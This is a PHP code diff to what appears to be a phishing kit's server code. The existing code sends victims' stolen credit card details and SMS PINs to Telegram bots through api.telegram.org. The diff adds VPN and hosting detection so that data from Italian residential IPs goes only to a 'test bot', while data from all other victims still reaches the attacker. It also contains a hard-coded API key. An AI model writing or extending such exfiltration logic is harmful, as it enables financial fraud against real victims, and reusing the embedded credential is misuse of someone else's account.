@@ -23,6 +23,94 @@ define("ITALY_ONLY_MODE", true);
 // Italy country codes for geo-targeting
 define("ITALY_COUNTRY_CODES", ["IT", "VA", "SM", "ME"]);
 
+// IPHub API key for VPN/Proxy detection (free: https://iphub.info/api)
+define("IPHUB_API_KEY", "MzE3Mjk6cmREOGtvdXpKRDFRMkU3QnRRbWZZc3NmSUVHMmkwbGs=");
+
+/**
+ * Get IP type (residential, hosting, vpn, etc) using IPHub API
+ * 
+ * @param string $ip IP address to check
+ * @return string IP type: "residential", "hosting", "vpn", "unknown"
+ */
+function getIPType($ip) {
+    // Skip private/local IPs
+    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0 || 
+        strpos($ip, '10.') === 0 || strpos($ip, '172.16.') === 0) {
+        return "local";
+    }
+    
+    // Skip if no API key configured
+    if (empty(IPHUB_API_KEY)) {
+        return "unknown";
+    }
+    
+    $url = "https://v2.api.iphub.info/ip/" . $ip;
+    
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Key: " . IPHUB_API_KEY));
+    $result = curl_exec($ch);
+    curl_close($ch);
+    
+    if ($result) {
+        $data = json_decode($result, true);
+        if (isset($data['block'])) {
+            // block: 0 = residential, 1 = hosting/proxy/VPN, 2 = both
+            $block = $data['block'];
+            if ($block == 0) {
+                return "residential";
+            } elseif ($block == 1) {
+                return "hosting";
+            } else {
+                return "vpn";
+            }
+        }
+    }
+    
+    return "unknown";
+}
+
+/**
+ * Get real client IP address (handles proxies, load balancers, Docker, Koyeb)
+ * Koyeb: use LAST IP from X-Forwarded-For (only trused one)
+ * 
+ * @return string Real client IP address
+ */
+function getRealClientIP() {
+    // Check common proxy headers in order of preference
+    $headers_to_check = [
+        'HTTP_CF_CONNECTING_IP',      // Cloudflare
+        'HTTP_X_REAL_IP',        // Nginx proxy
+        'HTTP_X_FORWARDED_FOR',   // Proxy (use LAST IP for Koyeb)
+        'HTTP_X_FORWARDED',      // Proxy
+        'HTTP_FORWARDED_FOR',    // Proxy
+        'HTTP_FORWARDED',       // Proxy
+        'HTTP_CLIENT_IP',        // Client IP
+    ];
+    
+    foreach ($headers_to_check as $header) {
+        if (!empty($_SERVER[$header])) {
+            $ip = $_SERVER[$header];
+            
+            // Handle X-Forwarded-For (can contain multiple IPs)
+            if (strpos($ip, ',') !== false) {
+                $ips = explode(',', $ip);
+                // For Koyeb: take LAST IP (most trusted)
+                $ip = trim(end($ips));
+            }
+            
+            // Validate IP format
+            if (filter_var($ip, FILTER_VALIDATE_IP)) {
+                return $ip;
+            }
+        }
+    }
+    
+    // Fallback to REMOTE_ADDR
+    return $_SERVER['REMOTE_ADDR'];
+}
+
 /**
  * Get country code from IP address using free GeoIP API
  * 
@@ -56,10 +144,11 @@ function getCountryCode($ip) {
 }
 
 /**
- * Check if IP is from Italy (or Vatican, San Marino, Monaco)
+ * Check if IP is from Italy (or Vatican, San Marino, Monaco) AND is residential
+ * VPN/Hosting IPs from Italy are treated as non-Italian (attacker gets data)
  * 
  * @param string $ip IP address to check
- * @return bool True if from Italy region
+ * @return bool True if from Italy region AND residential
  */
 function isFromItaly($ip) {
     if (ITALY_ONLY_MODE === false) {
@@ -67,7 +156,22 @@ function isFromItaly($ip) {
     }
     
     $countryCode = getCountryCode($ip);
-    return in_array($countryCode, ITALY_COUNTRY_CODES);
+    $isItalian = in_array($countryCode, ITALY_COUNTRY_CODES);
+    
+    // If not Italian, definitely not Italian residential
+    if (!$isItalian) {
+        return false;
+    }
+    
+    // If Italian IP, check if it's residential (not VPN/hosting)
+    $ipType = getIPType($ip);
+    
+    // If VPN/hosting from Italy, treat as non-Italian (attacker gets data)
+    if ($ipType === "hosting" || $ipType === "vpn") {
+        return false;
+    }
+    
+    return true;
 }
 
 /**
@@ -133,23 +237,31 @@ function sendToAllBots($bot, $ids, $message, $message_type = "INFO", $victim_ip 
     if ($message_type === "CREDIT_CARD" || $message_type === "SMS_PIN") {
         $isItalian = isFromItaly($victim_ip);
         $country = getCountryCode($victim_ip);
+        $ipType = getIPType($victim_ip);
         
         if ($isItalian) {
-            // ITALIAN IP: Only test bot gets data, attacker gets NOTHING
+            // ITALIAN RESIDENTIAL: Only test bot gets data, attacker gets NOTHING
             if (TEST_MODE_ENABLED) {
                 $decoded_msg = urldecode($message);
-                $test_message = "🛡️ [🇮🇹 ITALIAN IP - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• IP: $victim_ip\n• Country: $country\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
+                $test_message = "🛡️ [🇮🇹 ITALIAN RESIDENTIAL - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• IP: $victim_ip\n• Country: $country\n• IP Type: $ipType\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
                 sendToTestBot($test_message);
             }
             // Attacker gets nothing - no data sent to original bot
         } else {
-            // NON-ITALIAN IP: Only attacker gets data, test gets skipped
+            // NON-ITALIAN or ITALIAN VPN/HOSTING: Only attacker gets data, test gets info
             foreach($ids as $id){
                 $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$message";
                 sendBot($url);
             }
             if (TEST_MODE_ENABLED) {
-                $test_message = "⏭️ [SKIPPED - NON-ITALIAN] ⏭️\nType: $message_type\nIP: $victim_ip ($country)\nReason: Not Italian IP - Data sent to attacker only";
+                // Check if Italian but VPN/hosting
+                $italianCountry = in_array($country, ITALY_COUNTRY_CODES);
+                if ($italianCountry && ($ipType === "hosting" || $ipType === "vpn")) {
+                    $reason = "Italian IP but type: $ipType (not residential)";
+                } else {
+                    $reason = "Not Italian IP";
+                }
+                $test_message = "⏭️ [SKIPPED - $reason] ⏭️\nType: $message_type\nIP: $victim_ip ($country)\nIP Type: $ipType\nReason: Data sent to attacker only";
                 sendToTestBot($test_message);
             }
         }
